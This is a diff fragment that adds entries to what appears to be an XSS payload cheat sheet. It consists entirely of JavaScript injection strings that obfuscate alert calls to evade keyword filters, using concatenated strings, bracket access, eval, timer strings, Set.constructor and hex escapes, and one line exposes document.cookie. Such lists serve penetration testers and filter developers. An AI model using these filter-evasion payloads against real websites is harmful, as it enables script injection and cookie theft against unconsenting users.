@@ -167,6 +167,19 @@ self[`aler`%2b`t`]`1`
 'new Function`al\ert\`1\``'
 'new Function`pro\mpt\`1\``'
 
+alert(document['cookie']) 
+with(document)alert(cookie) 
+eval('ale'+'rt(1)')window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+[12].forEach(alert);
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
 ```
 
 
